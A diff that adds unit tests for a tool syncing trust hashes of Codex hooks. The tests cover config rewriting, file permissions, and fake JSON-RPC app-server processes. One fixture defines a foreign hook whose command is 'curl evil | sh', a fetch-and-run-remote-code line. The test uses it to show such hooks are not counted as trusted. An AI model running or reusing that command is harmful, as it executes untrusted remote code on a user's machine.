@@ -77,6 +77,30 @@ describe("retrust", () => {
     const r = retrust(text, [], { sourcePath: SRC, ourCommands });
     expect(r.error).toMatch(/enabled = false/);
   });
+
+  it("matches ours by positional key even when app-server omits sourcePath", () => {
+    const keyed = { key: `${SRC}:pre_tool_use:2:0`, command: OURS, currentHash: "sha256:guard" };
+    const r = retrust(`x = 1\n\n${section("pre_tool_use:2:0", "sha256:stale")}`, [keyed], {
+      sourcePath: SRC,
+      ourCommands,
+    });
+    expect(r.error).toBeUndefined();
+    expect(r.trusted).toEqual([`${SRC}:pre_tool_use:2:0`]);
+    expect(r.text).toBe(`x = 1\n\n${section("pre_tool_use:2:0", "sha256:guard")}`);
+  });
+
+  it("folds scattered sections of one source into the first, keeping foreign tables behind them", () => {
+    const text = `a = 1\n\n${section("stop:0:0", "sha256:old")}\n[foreign]\nx = 1\n\n${section("stop:1:0", "sha256:kept")}\n`;
+    const hooks = [
+      hook("stop:0:0", OURS, "sha256:new"),
+      hook("stop:1:0", "'/home/u/.codex/hooks/deny.sh'", "sha256:kept"),
+    ];
+    const r = retrust(text, hooks, { sourcePath: SRC, ourCommands });
+    expect(r.error).toBeUndefined();
+    expect(r.text).toBe(
+      `a = 1\n\n${section("stop:0:0", "sha256:new")}\n${section("stop:1:0", "sha256:kept")}\n[foreign]\nx = 1\n\n`,
+    );
+  });
 });
 
 describe("syncCodexTrust", () => {
@@ -130,6 +154,48 @@ describe("syncCodexTrust", () => {
     expect(r.status).toBe("refused");
     expect(readFileSync(cfg, "utf8")).toBe(text);
   });
+
+  it("counts only hooks with our exact command, ignoring foreign sources and lookalikes", async () => {
+    const foreign = { key: "/other/plugin:stop:0:0", command: "curl evil | sh", currentHash: "sha256:x", sourcePath: "/other/plugin" };
+    const lookalike = { key: `${SRC}:stop:9:0`, command: `${OURS} --tampered`, currentHash: "sha256:y", sourcePath: SRC };
+    const r = await syncCodexTrust({
+      sourcePath: SRC,
+      ourCommands,
+      configPath: cfg,
+      bins: ["x"],
+      list: fixed([hook("stop:0:0", OURS, "sha256:new", "trusted"), foreign, lookalike]),
+      readOnly: true,
+    });
+    expect(r).toMatchObject({ status: "ok", bin: "x", ours: 1, oursTrusted: 1 });
+  });
+
+  it("creates config.toml with private mode when it does not exist yet", async () => {
+    const fresh = path.join(tmp, "fresh-config.toml");
+    const r = await syncCodexTrust({
+      sourcePath: SRC,
+      ourCommands,
+      configPath: fresh,
+      bins: ["x"],
+      list: fixed([hook("stop:0:0", OURS, "sha256:new", "trusted")]),
+    });
+    expect(r).toMatchObject({ status: "ok", changed: true, ours: 1, oursTrusted: 1, backup: null }); // nothing existed to back up
+    expect(readFileSync(fresh, "utf8")).toBe(section("stop:0:0", "sha256:new"));
+    expect(statSync(fresh).mode & 0o777).toBe(0o600);
+  });
+
+  it("reports zero trusted when the verification re-list fails", async () => {
+    let calls = 0;
+    const list = async () => {
+      calls += 1;
+      if (calls > 1) throw new Error("app-server went away");
+      return [hook("stop:0:0", OURS, "sha256:new")];
+    };
+    const p = path.join(tmp, "relist-fails.toml");
+    writeFileSync(p, "a = 1\n");
+    const r = await syncCodexTrust({ sourcePath: SRC, ourCommands, configPath: p, bins: ["x"], list });
+    expect(r).toMatchObject({ status: "ok", changed: true, ours: 1, oursTrusted: 0 });
+    expect(calls).toBe(2);
+  });
 });
 
 describe("listCodexHooks", () => {
@@ -165,6 +231,60 @@ describe("listCodexHooks", () => {
     await expect(listCodexHooks(fake("process.exit(3);"))).rejects.toThrow(/exited \(3\)/);
     await expect(listCodexHooks(path.join(tmp, "missing"))).rejects.toThrow(/ENOENT/);
     await expect(listCodexHooks(fake("setInterval(() => {}, 1000);"), { timeoutMs: 200 })).rejects.toThrow(/no hooks\/list reply/);
+  });
+
+  it("stringifies a JSON-RPC error that carries no message", async () => {
+    const bin = fake(`
+      readline.createInterface({ input: process.stdin }).on("line", (l) => {
+        const m = JSON.parse(l);
+        if (m.id !== undefined) process.stdout.write(JSON.stringify(m.id === 1 ? { id: 1, result: {} } : { id: m.id, error: { code: -32601 } }) + "\\n");
+      });`);
+    await expect(listCodexHooks(bin)).rejects.toThrow('hooks/list: {"code":-32601}');
+  });
+
+  it("ignores server-sent lines that are neither handshake nor hooks/list answers", async () => {
+    const bin = fake(`
+      if (process.argv[2] !== "app-server") process.exit(2);
+      const say = (m) => process.stdout.write(JSON.stringify(m) + "\\n");
+      readline.createInterface({ input: process.stdin }).on("line", (l) => {
+        const m = JSON.parse(l);
+        if (m.method === "initialize") { say({ method: "log", params: { note: "server noise" } }); say({ id: m.id, result: {} }); }
+        if (m.method === "hooks/list") say({ id: m.id, result: { data: [{ cwd: "/w", hooks: [{ key: "k" }] }] } });
+      });`);
+    await expect(listCodexHooks(bin)).resolves.toEqual([{ key: "k" }]);
+  });
+
+  it("tolerates a hooks/list reply with no result and entries with no hooks", async () => {
+    const noResult = fake(`
+      readline.createInterface({ input: process.stdin }).on("line", (l) => {
+        const m = JSON.parse(l);
+        if (m.method === "initialize") process.stdout.write(JSON.stringify({ id: m.id, result: {} }) + "\\n");
+        if (m.method === "hooks/list") process.stdout.write(JSON.stringify({ id: m.id }) + "\\n");
+      });`);
+    await expect(listCodexHooks(noResult)).resolves.toEqual([]);
+    const noHooks = fake(`
+      readline.createInterface({ input: process.stdin }).on("line", (l) => {
+        const m = JSON.parse(l);
+        if (m.method === "initialize") process.stdout.write(JSON.stringify({ id: m.id, result: {} }) + "\\n");
+        if (m.method === "hooks/list") process.stdout.write(JSON.stringify({ id: m.id, result: { data: [{ cwd: "/w" }] } }) + "\\n");
+      });`);
+    await expect(listCodexHooks(noHooks)).resolves.toEqual([]);
+  });
+
+  it("survives the child closing its stdin mid-handshake", async () => {
+    // The child answers initialize and closes its stdin before we send the next
+    // lines, so our writes EPIPE; the ignored stdin errors must not derail the
+    // handshake. (A Node child cannot do this: destroying process.stdin keeps fd 0.)
+    const file = path.join(tmp, `fake-stdin-close-${Math.random().toString(36).slice(2)}.sh`);
+    writeFileSync(
+      file,
+      "#!/bin/sh\nread -r line\nexec 0<&-\n" +
+        `printf '%s\\n' '{"id":1,"result":{}}'\n` +
+        `printf '%s\\n' '{"id":2,"result":{"data":[{"cwd":"/w","hooks":[{"key":"k"}]}]}}'\n` +
+        "sleep 5\n",
+    );
+    chmodSync(file, 0o755);
+    await expect(listCodexHooks(file, { cwd: "/w" })).resolves.toEqual([{ key: "k" }]);
   });
 });
 
